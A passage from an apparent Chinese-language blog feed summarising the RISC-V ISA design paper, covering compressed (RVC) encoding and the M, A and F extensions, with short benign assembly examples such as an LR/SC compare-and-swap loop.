/></center><p>考虑到一些寄存器的访问频率远远高于其他寄存器，<u>为了节省编码位数，多数指令被限制为仅可以访问少数最常用的寄存器</u>。例如，CIW 和 CL 指令只能访问 8 个被称为 RVC 寄存器 <code>x8</code> - <code>x15</code>。在标准调用规范中，这些寄存器对应了两个被调用者保存（callee-saved）的寄存器 <code>s0</code> 和 <code>s1</code> ，和 6 个调用者保存（caller-saved）的寄存器 <code>a0</code> - <code>a5</code>。</p><p><u>另外，还有些指令隐式地访问了 ABI 中具有特殊意义的寄存器</u>：零寄存器 <code>x0</code>、链接寄存器 <code>ra</code> 和堆栈指针 <code>sp</code> 。虽然此决策增加了译码的复杂性，但对于在有限的编码空间中捕获一些常见现象（如寄存器溢出）是必要的。事实上，译码电路增加的复杂性是有限的，因为上述几个寄存器的前 3 个 MSB 位都是一样的。</p><p><u>大多数指令格式都包含一个立即数</u>。然而，对于不同指令而言，最常见的立即数值差别很大。例如，而一些 RISC-V 指令通常具有负立即数，其他指令很少这样。前一种情况的典型例子是向后分支等情况。另一方面，相对于堆栈的 loads 和 stores 就不会有负的偏移量，因为使用堆栈指针之下的空间是非法的。因此，不像在基本 ISA 中，它只有符号扩展的立即数，一些 RVC 指令有零扩展。如果我们仅对立即数进行符号扩展，则可压缩的 loads 和 stores 将减少 12%。</p><p>类似地，几乎所有的 loads 和 stores 在 RISC-V 程序中都是对齐的，在这种情况下，它们的偏移量可以被字的大小整除。<u>考虑到这个属性，RVC 中的所有 loads 和 stores 偏移量都按字大小对齐</u>。如果我们不这样做，可压缩的 loads 和 stores 将减少 44%。如果我们对这些立即数进行符号扩展，损失将增加到 62% ——或减少 19% 的总压缩量。</p><h3 id="RVC-指令编码">RVC 指令编码</h3><p>下图表示了 RV32C 和 RV64C 指令的编码情况，以及对应的基础 ISA。ISAs 总共有 44 条指令，其中 RV64C 39 条，RV32C 32 条。</p><center>  <img src="/img/RV32C_RV64C.png" /></center><p>整数算术运算是最常见的一类指令，占用了 19 个操作码。5 个 RVC 指令扩展到 ADDI ，这反映出其使用非常频繁：加法（C.ADDI）、累加堆栈指针（C.ADDI16SP）、生成堆栈相对地址 （C.ADDI4SPN）、立即数加载（<a href="http://C.LI">C.LI</a>）和 C.NOP。许多算术运算是破坏性的，只针对 RVC 寄存器；最常用的指令可以操作任何寄存器。</p><p>loads 和 stores 是下一个最具代表性的指令类，占 16 个操作码。RV32C 可以移动 32 位整数和浮点数，以及 64 位浮点数；RV64C 支持 32 位和 64 位整数，但只支持 64 位浮点数（RV32C 32 位浮点加载和存储与 RV64C 64 位整数加载和存储占用相同的操作码空间）。对于每个数据类型，有两种寻址方式：基址加偏移量，基址从 RVC 寄存器中取得，以及相对于栈指针的寻址方式，该方式有一个更远的偏移量。在所有情况下，偏移量都是无符号的，并以数据类型的大小为基本单位。</p><p>RVC 提供了条件分支，用于检测是否等于零（C.BEQZ 和 C.BNEZ）、无条件直接跳转（C.J）和寄存器—间接跳转（C.JR）。另外，后两者会链接到 <code>x1</code>，C.JAL 和 C.JALR 指令在标准调用规范下适合函数调用（由于操作码空间有限，RV64C 除去了 C.JAL）。C.EBREAK 是一个断点指令，简化了 RVC 程序的调试。</p><p>下图详细地展示了 RV64C 的编码情况。其中 loads 和 stores 就占了 50% 的编码空间，在其余的空间中，算术指令占了 3/4 ，剩下的就是控制流指令。</p><center>  <img src="/img/RV64C.png" /></center><p>这一编码方案的明显特征是有大量的立即数编码格式，这是压缩编码空间的结果。然而，就像在 base ISA 一样，立即数编码被打乱了，为的是能最小化产生的立即数的成本。在 12 个立即数选择中，18 个立即数位中的 8 个总是来自指令中相同的位；其中 5 位来自两个地方；4 个来自三个位置；一个来自四个位置。</p><p>还有其他一些微妙之处值得注意。对于带有符号扩展的立即数的指令，符号位总是在相同的位置，第 12 位。此外，这些指令都位于不同的操作码空间中，与那些具有零扩展立即数的指令不同；因此，MSB 立即数位（即第 18 位及以上）可以由三个指令的位生成。</p><p>对寄存器的译码其实也比你想象的要简单。除了某些指令会对隐式寄存器 <code>x0</code> <code>x1</code> <code>x2</code> 访问外，寄存器说明符至多来自三个位置，来计算在基本 ISA 中对应寄存器的编码位置，而译码也只需要检查三个操作码位。尽管如此，对寄存器说明符的译码对于许多实现来说都是至关重要的，尤其是超标量，它必须分析发射的指令集中的数据冒险。激进的实现可能需要额外的流水线阶段来处理增加的延迟，或者加上额外的交叉检查逻辑和寄存器映射表来推测地译码寄存器说明符的所有组合。</p><p>或许你已经注意到，还有很多的编码空间被保留了起来。指令 <code>0x0000</code> 在其他情况下会映射到一个冗余指令中，并被永久保留，以提高捕获错误代码的几率。此外，尽管使用所有的编码空间可以最大限度地压缩代码，但我们将一个主要的操作码和几个次操作码保留了下来，以防 RVC 在将来的软件中无法捕获重要的模式。最后，除了规范的 no-op 外，所有不修改体系结构状态的指令形式（例如，将寄存器的值加 0）都被保留下来。若在某个实现上，上述这些目前还没有意义，那么它们也将正确地不执行任何操作，不产生额外的硬件成本。</p>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
      <tag>RVC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Why RISC-V ?</title>
    <link href="/2020/09/19/2020-9-19-WHY%20RISC-V%203/"/>
    <url>/2020/09/19/2020-9-19-WHY%20RISC-V%203/</url>
    
    <content type="html"><![CDATA[<h1>Why RISC-V</h1><p>读 <a href="https://people.eecs.berkeley.edu/~krste/papers/EECS-2016-1.pdf">Design of the RISC-V ISA</a> 论文后的总结与思考。这是本系列的第三部分，在认识了 RISC-V 的基本 ISA 后，接下来我们介绍 RISC-V 的标准扩展，进一步体会这样设计带来的好处。</p><p>设计 RISC-V 时，我们定的一个目标就是使 RISC-V 能够既适用于资源紧张的低端实现，又能够适用于高性能计算实现。前者需要一个精简的 ISA ，后者要求一个高能效（意味着注定较为复杂的）ISA ，这就要求保留一些在嵌入式处理器或在任何通用处理器中非常重要的特性。RISC-V 用添加扩展的形式提供了很好的灵活性。RISC-V 目前有四种标准扩展——<strong>M</strong> 用于整数乘法和除法，<strong>A</strong> 用于原子内存操作，<strong>F</strong> 和 <strong>D</strong> 用于单精度和双精度浮点，它们一起构成了用于通用计算的强大 ISA。</p><h2 id="整数乘除">整数乘除</h2><p>在许多应用中，特别是那些有很多的定点计算的软件中，整数乘除法是常见的运算。虽然它们在计算操作中不占主导，但当软件运行时，就会发现它们仍可以占据很大一部分运行时间。因此，对于大多数应用程序来说，硬件加速这些操作是必须的。图中显示了 <strong>RISC-V M</strong> 的若干指令。</p><center>    <img src="/img/RV32M.png" /></center><p>我们考虑将 <strong>M</strong> 扩展进一步分解为单独的乘法和除法扩展，但要明白一点，得出这两种扩展的需求的过程是紧密相关的。此外，若迭代乘法器在低端的 ASIC 上已实现，那么其实可以用较小的代价设计出迭代除法器。另一方面，对于许多 FPGA 来说，除法要比乘法困难得多，但由于乘法块的存在，处理器可以选择 trap 除法指令并在软件中模拟它们。</p><p>与其他 RISC ISAs 为乘法和除法指令添加了特殊的结构寄存器不同，<strong>RISC-V  M</strong> 扩展中的指令直接在整数寄存器上操作。<u>这一设计消除了与特殊的结构寄存器来往发数据的步骤，减少了指令条数以及延迟；减少了线程转换时的上下文大小；让编译器更好地进行代码优化</u>。对于某些实现来说，写回部分的控制逻辑略有增加，但我们觉得这一微小的成本很容易被带来的好处抵消。对于使用寄存器重命名的实现，这一策略降低了复杂性，因为它消除一类为了提供性能而需要重命名的寄存器。</p><p>RV32M 增加了 4 条计算 32×32 位的乘法指令：MUL，它返回乘积的低 32 位；以及 MULH 、MULHU 和 MULHSU[^foot1]，它们都返回乘积的高 32 位，但分别将乘数和被乘数当作有符号、无符号和有符号无符号的混合处理（当然，低 32 位的乘积不需要考虑符号）。<u>后三条指令对于定点计算是非常重要的，因为它们能够实现一个重要的优化：一个常数除法总是可以通过一个近似的倒数转化为乘法，再对乘积的高位部分进行修正（见下例）</u>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nasm"># compute unsigned division of a0 by 3 using multiplication<br>0:  aaaab2b7lui  t0, 0xaaaab  # t0 = 0xaaaaaaab<br>4:  aab28293addi t0, t0, -1365  #  = ~2^32 /1.5<br>8:  025535b3    mulhu a1, a0, t0    # a1 = ~(a0 / 1.5)<br>c:0015d593    srli a1, a1, 0x1    # a1 = (a0 / 3)<br></code></pre></td></tr></table></figure><p>[^foot1]: MULHSU 对于多字有符号乘法很有用，因为当乘数的最高有效字（包含符号位）与被乘数的较低有效字（无符号）相乘时，就需要用到它，这是多字有符号乘法的子步骤。</p><p>还有四条指令执行 32×32 位的除法：DIV 和 DIVU，它们用于有符号除法和无符号除法；还有 REM 和 REMU，用于求有符号余数和无符号余数。在 C99 之后，带符号的除法会向 0 取整，余数与被除数符号相同。<em>除零不会导致异常</em>（见下引用）；希望出现异常的编程语言可以<a href="https://stackoverflow.com/questions/48000665/risc-v-rv32m-spec-v2-0-why-not-zero-check-before-div">在启动除法操作后在除法后加上分支指令</a>。注意到，高度可预测的分支对性能的影响应该是很小。</p><blockquote><p>The quotient of division by zero has all bits set, i.e. <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>X</mi><mi>L</mi><mi>E</mi><mi>N</mi></mrow></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{XLEN}−1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9247em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="mord mathnormal mtight">L</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">EN</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> for unsigned division or −1 for signed division. The remainder of division by zero equals the dividend. Signed division overflow occurs only when the most-negative integer, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mrow><mi>X</mi><mi>L</mi><mi>E</mi><mi>N</mi></mrow></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">−2^{XLEN}−1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9247em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="mord mathnormal mtight">L</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">EN</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> , is divided by −1. The quotient of signed division overflow is equal to the dividend, and the remainder is zero. Unsigned division overflow cannot occur.</p></blockquote><p>最后，RV64M 扩展了这些指令，以操作 64 位寄存器，还添加了 5 条以 W 结尾的指令，这些指令对 32 位数据进行运算得到 32 位结果后，再符号扩展到 64 位。</p><h2 id="多处理器同步">多处理器同步</h2><p>在 1962 年，Edsger Dijkstra 注意到一个由 Theodorus Dekker 设计的算法可以在仅使用常规的 loads 和 stores 下解决互斥锁问题。然而，Dekker 的算法在并发线程数量的扩展性上表现的很糟：在 n 个线程中获得一个共享锁需要 O(n) 个操作。因而，早期的并发单处理器和并行多处理器的架构师增加了硬件同步机制来加速互斥，比如 <em>test-and-set</em>，自动置位并返回旧值。</p><p>互斥是一种完全通用的同步机制，且 <em>test-and-set</em> 很容易实现。然而，这种策略不能很好地用于高度并行的系统，因为它不足以构造无等待的同步原语，比如非阻塞的生产者——消费者队列。几个可选原语就足够了；其中，原子的 <em><a href="https://segmentfault.com/a/1190000015239603">compare-and-swap</a></em> (CAS) 是最主流的。CAS 比较寄存器和与另一个寄存器中内存地址指向的值，若比较数相等，就将第三个寄存器的值写入到该内存地址中，这是一条通用的同步原语，其他同步操作可以以它为基础来完成。</p><p>考虑到并行计算的应用，我们设计的 RISC-V ，应当可被用于带有极多线程级并行度的系统。我们本打算让 <strong>RISC-V A</strong> 以只包含 CAS 的方式提供内存原子操作；的确，我们曾对这一选择深思熟虑。<u>但是 CAS 需要三个源操作数（内存地址、比较和交换值），这意味着需要一个新的整数指令类型，必然使得处理器微体系结构设计复杂化</u>，还需要增加附有额外数据字的内存系统命令形式。因此，我们参考了几个早期 RISC ISAs（包括 MIPS 和 Alpha ）的做法，提供了 <em>load-reserved</em>（LR）和 <em>store-conditional</em>（SC）指令。这些低级的原语将原子操作拆分为 load、compute 和 store 三个阶段。LR 执行正常的 load，但注册了一个在内存上的保留。如果时间过长，或者另一个处理器请求相同的地址，该保留会被取消。SC 尝试执行 store ，但只有在拿到保留时才会成功；此外，它将成功或失败的标志写入一个目的寄存器 <code>rd</code> ，以便程序可以根据结果进行分支。通常，LR/SC 序列形成循环体，循环直到 SC 成功为止。</p><center>    <img src="/img/RVA.png" /></center><p>具体来说，LR 和 SC 保证了它们两条指令之间的操作的原子性。LR 读取一个内存字，存入到 <code>rd</code> 寄存器中，并留下这个字的保留记录。而如果 SC 的目标地址上存在保留记录，它就把字存入这个地址。如果存入成功，它向目标寄存器 <code>rd</code> 中写入 0；否则写入一个非 0 的错误代码。</p><p>在成功执行的 SC 之后的 LR 是对修改后的内存字的原子操作。换句话说，没有线程可以观察到在这两者之间发生的另一个内存操作。类似地，在配对 LR 操作之前，不能认为 SC 已经发生。</p><p>LR/SC 模式的主要优点是，<u>它既易于实现，又非常通用</u>：它可以用来构造任何单字原子操作，包括 CAS（见示例代码）。然而， LR/SC 的简单的实现会在多个处理器争用同一个数据时，遇到<a href="https://www.guru99.com/what-is-livelock-example.html">活锁</a>（livelock）的麻烦。<u>为了解决这个问题，我们要求 LR/SC 的代码序列长度必须有限制（16 条连续的静态指令），前提是它们只包含基本 ISA 指令，除了 load 、store 以及被 taken 的分支</u>[^foot2]。这一规定允许实现通过在限定的时间内阻止缓存中指令的插入这一简单的做法来保证机器能够继续向前（不产生活锁）。当然，它也对微体系结构施加了一些限制。指令序列最终必须能放入 cache，即使它与保留的数据冲突；例如，统一指令/数据的缓存和 TLBs 至少必须是双向集关联的。</p><p>[^foot2]: 为何规定长度必须在 16 条连续的静态指令内呢？其实这个约束有几个微妙之处。不能有 taken 分支限制了动态指令数量，16 条指令的限制意味着直接映射指令缓存的大小就足够了——只要它们可以保存至少 64 个连续的字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nasm">retry: lr.w t0, (a0) ## atomically &#123;<br>       bne t0, a1, fail ## if (M[a0] == a1)<br>       sc.w t0, a2, (a0) ## M[a0] = a2;<br>       bnez t0, retry ## &#125;<br></code></pre></td></tr></table></figure><p>LR/SC 相对于 CAS 的另一个好处是，它避免了所谓的 <a href="https://en.wikipedia.org/wiki/Compare-and-swap">ABA</a> 问题，即将内存位置从值 A 修改为值 B，然后再修改回值 A 的麻烦。由于 CAS 的成功执行取决于值是否相等，因此它无法检测到这种情况，从而使无等待数据结构的实现复杂化。一种常见的解决方法是提供双字 CAS 操作，其中的第二个字用作版本号。但是，这种方法使 ISA 和实现复杂化了：双字 CAS 有四个源寄存器和两个目标寄存器操作数，并修改两个内存字。幸好，LR/SC 没有遇到 ABA 问题，因为它检测任何插入的内存写入，不论最终是否保留了该值。</p><h3 id="Atomic-Memory-Operations">Atomic Memory Operations</h3><p>虽然只提供 LR/SC 原语就足够了，但我们仍提供了几个原子内存操作指令（AMOs），AMO 指令执行多处理器的同步读-修改-写操作，并使用 R-type 格式进行编码。它们对一个内存字执行简单的算术和逻辑运算，并将目标寄存器设置为操作前的内存旧值。内存读写之间的过程不会被打断，内存值也不会被其它处理器修改。这些指令的功能有加法；有符号和无符号的求最小最大值；与、或、异或运算；以及交换。<u>这些 AMOs 为高并行系统提供了一个重要的优化：当一个内存字被竞争时，AMO 可以被发送到内存字，而不是获得对包含该字的高速缓存线的独占访问</u>。除了减少延迟、网络占用和<a href="https://en.wikipedia.org/wiki/Thrashing_(computer_science)">缓存震荡</a>外，该策略还改善了 Amdahl 法则的瓶颈。若没有 AMOs，那么由于 LR/SC 例程包含的是一般的指令序列，因此很难执行这样的优化。当然，有的架构师认为不需要浪费硬件资源来实现 AMOs ，也可以用 LR/SC 原语合成 AMOs， microcode 或者更高特权级的 software trap 都是可以的。</p><p>我们有意识地忽略了在 sub-word 上的 AMOs，因为它们在大多数情况下很少见。最常见的 sub-word AMOs 是按位逻辑操作，然而该操作很容易由 word AMOs 实现（使用一些额外的指令来隐藏地址并转移数据）。LR/SC 序列也可以实现其他的 AMOs 。下面的代码显示了如何使用 LR/SC 实现 byte 大小的操作数的原子获取和加法操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nasm">andi t0, a0, 3 # Shift<br>slli t0, t0, 3 # addend<br>sll a1, a1, t0 # into place.<br>addi t1, x0, 255 # Generate<br>sll t0, t1, t0 # mask.<br>andi a0, a0, ~3 # Clear address LSBs.<br>retry: <br>lr.w t2, (a0) # Load operand.<br>add t3, a1, t2 # Perform<br>xor t4, t3, t2 # addition<br>and t1, t4, t0 # under<br>xor t2, t1, t2 # mask.<br>sc.w t2, t2, (a0) # Attempt to store result.<br>bne t2, x0, retry # Retry if store fails.<br></code></pre></td></tr></table></figure><p>[^foot3]: 所有的 RV32A 指令都有一个请求位（aq）和一个 释放位（rl）。aq 被置位的原子指令保证其它线程在随后的内存访问中看到顺序的 AMO 操作；rl 被置位的原子指令保证其它线程在此之前看到顺序的原子操作。想要了解更详细的有关知识，可以查看[Adve and Gharachorloo 1996]。</p><h3 id="RVA-Memory-Model">RVA Memory Model</h3><p><a href="https://www.cs.utexas.edu/~bornholt/post/memory-models.html">内存模型</a>是一个非常难懂的课题，在之前的博文中，我们说过 RISC-V 采用了 relaxed memory model ，因此一个线程看到的另一个线程的内存访问可以是乱序的，除非执行一个 FENCE 指令以保证一个特定的顺序。这与 <a href="https://preshing.com/20120930/weak-vs-strong-memory-models/">顺序一致性（sequential consistency）有很大的区别</a>。 <strong>A</strong> 扩展中的指令可以有效地实现 release consistency (RC) 内存模型。RC 是一种宽松的一致性模型，它通过区分不同风格的同步操作，为每一种操作分配不同的、较弱的排序属性，从而允许很大程度的一致性。RC 已经成为 2011 年版本的 C 和 C++ 语言的标准内存模型，并且它一直兼容 Java 内存模型。</p><p>在 RC 中，共享内存访问被分为了普通访问——乱序也不会导致竞争的 loads 和 stores，和特殊访问。RC 引入了两种重要的特殊访问：获取（acquire）和释放（release）。acquire 用于获得对共享变量的访问，而 release 操作释放了该变量的控制权。它们通常与获取互斥锁和释放互斥锁相关联。acquire 和 release 原语的语义是由 RC 模型中的内存顺序约束给出的，如图所示。在允许执行普通的加载和存储之前，必须执行所有的 acquires。同样地，在允许执行 release 之前，所有之前的普通加载和存储必须已经执行。最后，特殊访问必须是完全有序的。</p><center>    <img src="/img/releaseconsistency.png" /></center><p>这一限制导致了更严格的 RC ，称之为 RCsc ，其特殊访问必须顺序一致性（sequential consistency）。这个关键的特性支持无数据竞争的编程模型，它是硬件和软件之间的一种契约，保证了它看上去像顺序一致的内存系统，前提是对所有特殊访问都进行了适当的注释。其结果是，对于一类重要的程序，RCsc 既提供了 relaxed model 的更大并发性，又提供了顺序一致性的更简单的编程模型。</p><center><img src="/img/LRSC.png" /><img src="/img/AMO.png" /></center><u>**A** 扩展中的指令通过加上内存顺序注释来实现 RCsc 内存模型，在静态指令上的两位：aq 和 rl</u>[^foot3] 。当 aq 位被设置在 LR 、SC 或 AMO 上时，该指令被当作 acquire 访问，在同一个线程中不会看到在该指令之前的任何内存访问。当 rl 位被设置时，指令被当作 release 访问，这样它就不会被认为是在任何内存访问之前执行的。当 aq 和 rl 都没有设定时，就没有特定的顺序保证，适于组合简化。当两者都被设置时，该访问就是相对于其他访问顺序一致。<hr><h2 id="单精度浮点运算">单精度浮点运算</h2><p>浮点计算在一些应用领域是普遍存在的，甚至许多面向整数的程序使用足够的浮点来证明硬件支持。然而，基本 ISA 中排除了浮点指令，以支持不会使用它们的嵌入式实现，而且浮点运算最好是由附加的协处理器处理的处理。<strong>RISC-V F</strong> 扩展增加了对单精度浮点的支持，符合 IEEE 754 浮点运算标准。</p><center><img src="/img/RVF.png" /></center><p>在定义 F 扩展时，最有争议的决定就是：是否要将整数寄存器用于浮点计算？还是添加专用的浮点寄存器？前一种策略将简化 ISA，降低的实现成本，并减少上下文切换时间。尽管如此，我们最终还是选择添加了一组新的浮点寄存器，如上图所示，因为我们觉得优点大于缺点：</p><ul><li>整数寄存器和浮点寄存器的位宽不一定相同，例如，RV32 机器可能具有双精度浮点运算</li><li>我们希望实现能更灵活地使用内部编码格式，例如，在硬件中加速对<a href="https://en.wikipedia.org/wiki/Denormal_number">非正规数</a>（subnormal numbers）的处理时，不在同一个寄存器中表示整数和浮点数可以简化这种设计</li><li>添加一组新的寄存器文件可将寄存器容量和带宽翻倍，因为操作码（浮点数与整数肯定不同）提供了一个隐式说明，所以不需要改变指令格式，但可以提高处理器的性能</li><li>添加一组新的寄存器文件，事实上很自然地提供了一个寄存器文件的分库策略，简化了超标量对寄存器文件端口的实现</li><li>通过向寄存器文件中添加由微架构管理的脏位，可以减轻上下文切换的成本</li></ul><p>为了支持内部编码格式，我们决定避免在浮点寄存器中表示整数。这与 SPARC 、Alpha 和 MIPS  不同，它们完全在浮点寄存器文件中进行定点的转换，<u>RISC-V 使用整数寄存器对这些指令进行操作</u>。这种选择缩短了混合格式下常用的指令序列——例如，在地址计算中使用整数转换的结果时。</p><p>大多浮点运算的结果会进行四舍五入，但四舍五入方案因编程语言和算法而异。RISC-V 提供了五种四舍五入模式，其编码如下表所示：四舍五入到最接近的数字，并向偶数断开；舍入为零；向-∞舍入；向+∞舍入；四舍五入到最接近的数字，向零四舍五入。(IEEE 754-2008 只需要前四个，但根据我们的经验，第五个对于手工编写库例程很有用）。</p><table><thead><tr><th>Rounding Mode</th><th>Mnemonic</th><th>Meaning</th></tr></thead><tbody><tr><td>000</td><td>RNE</td><td>Round to Nearest, ties to Even</td></tr><tr><td>001</td><td>RTZ</td><td>Round towards Zero</td></tr><tr><td>010</td><td>RDN</td><td>Round Down (towards −∞)</td></tr><tr><td>011</td><td>RUP</td><td>Round Up (towards +∞)</td></tr><tr><td>100</td><td>RMM</td><td>Round to Nearest, ties to Max Magnitude</td></tr><tr><td>111</td><td>DYN</td><td>Dynamic rounding, based on <em><strong>frm</strong></em> register</td></tr></tbody></table><p>在大多数编程语言中，四舍五入的方向应动态指定。对此，<u>我们规定所有浮点指令都可以使用动态舍入模式，在浮点控制和状态寄存器的</u> <em><strong>frm</strong></em> <u>字段中设置</u>，其格式为下图所示。此外，一些操作，比如在 C 和 Java 中从浮点类型强制转换为整数类型，需要在特定方向上舍入。在不修改动态舍入模式的情况下支持这些操作是可取的，而且还有助于加速库例程的实现，比如先验函数。因此，我们为所有浮点运算提供了动态舍入模式或静态选择其中一种。这个额外的 3 位字段会使 F 扩展消耗了大量的编码空间，但我们认为通用性和提升的性能证明这些开销是合理的。</p><h3 id="异常处理">异常处理</h3><p>大多数浮点运算会产生 IEEE 754 标准下的异常：指示算术错误或不精确的运行时条件。一共有 5 种异常：无效运算（对 -1 开根号）；除零；上溢出；下溢出；不精确（指存在舍入）。IEEE 标准没有规定这些异常是否会导致陷阱。<u>在 RISC-V 中，我们选择不将这些异常变为陷阱，以方便非推测性的乱序完成浮点操作</u>。如果不这样做，顺序流水线的实现将不得不在不精确 trap 和顺序完成之间进行选择，前者暴露了实现细节并使系统软件复杂化，而后者要么使流水线变深，要么降低了性能。</p><p>虽然我们不将这些异常变为陷阱，我们仍然有可能编写对浮点异常进行处理的软件。这五个异常放入到浮点状态寄存器后，软件可以检查这些寄存器，并根据它的值转移到用户级异常处理程序。由于触发应计异常标志是一种关联操作，因此应计异常寄存器仍然允许无序指令完成。直接操作异常标志的指令只需要互锁，直到所有未完成的指令完成，再接着处理异常就可以了。</p><h3 id="NaN-的产生与传播"><a href="https://en.wikipedia.org/wiki/NaN">NaN 的产生与传播</a></h3><p>IEEE 754-1985 浮点标准使几个商业竞争对手达成妥协，共同寻求结束 Velvel Kahan 所描述的那种状态——浮点算术中的“无政府状态”（当然，对于有些人来说这一不那么无私的决定是为了防止 Intel 不遵守标准😓）。为了尽量减少各派之间的不满，标准给实现留下了一些细节，例如，应该在四舍五入之前还是之后检测下溢出，NaN 是如何生成和传播的，以及如何区分 signaling NAN 和 quiet NaN[^foot4]。</p><p>[^foot4]: 分别有两者类型的 NaN，一个叫 <em>quiet NaNs</em> 另一个是 <em>signaling NaNs</em>. Quiet NaNs 被用作传播无效操作或值等错误。Signaling NaNs 可支持更加复杂的特性，比如混合数值和<a href="https://en.wikipedia.org/wiki/Computer_algebra">符号计算</a>或者其他基本的浮点数运算扩展。</p><p>然而，标准留下的回旋的余地却导致了一个惊人的分裂。看看下面的表格，不同的 ISAs 对 NaN 的编码几乎完全不同。MIPS 和 PA-RISC 选择用 quiet bit clear来表示 quiet NaN，这违反了 IEEE 754-2008 标准。其他的区别在于其余的尾数（也叫有效位数，Significand） 部分是 1 还是 0 ，以及比较惊讶的是，符号位是否设置了。至于 <a href="">RISC-V NaN</a>，我们选择将符号位清零，除 quiet bit 之外所有尾数位都清零的方案。即如果一个浮点运算的结果是 NaN，那么它就是 canonical NaN。canonical NaN 有一个正的符号位（即 0），除了 MSB （也叫做 quiet bit）之外，所有的符号都清零。在 RISC-V 中，对于单精度浮点数，canonical NaN 对应于 0x7fc00000 。这样做的原因有四：</p><table><thead><tr><th>ISA</th><th>Sign</th><th>Significand(23 bits)</th><th>QNaN Polarity[^foot5]</th></tr></thead><tbody><tr><td>SPARC</td><td>0</td><td>11111111111111111111111</td><td>1</td></tr><tr><td>MIPS</td><td>0</td><td>01111111111111111111111</td><td>0</td></tr><tr><td>PA-RISC</td><td>0</td><td>01000000000000000000000</td><td>0</td></tr><tr><td>x86</td><td>1</td><td>10000000000000000000000</td><td>1</td></tr><tr><td>Alpha</td><td>1</td><td>10000000000000000000000</td><td>1</td></tr><tr><td>ARM</td><td>0</td><td>10000000000000000000000</td><td>1</td></tr><tr><td>RISC-V</td><td>0</td><td>10000000000000000000000</td><td>1</td></tr></tbody></table><p>[^foot5]: QNaN polarity refers to whether the most significant bit of the significand indicates that the NaN is quiet when set, or quiet when clear.</p><ul><li>与至少一个其他 ISA (ARM) 相同的缺省 NaN，这样做不会加剧 IEEE 754 的分化</li><li>与 Java 编程语言的 canonical NaN 相同（大多数其他编程语言都没有定义）</li><li>根据 IEEE 754 标准以及 RISC-V 的 QNaN polarity ，quiet NaN 事实上有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>22</mn></msup></mrow><annotation encoding="application/x-tex">2^{22}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span></span></span></span></span></span></span></span> 个，而signaling NaN 有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>22</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{22}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>个（因为尾数全 0 对应的是无穷大）。而恰巧 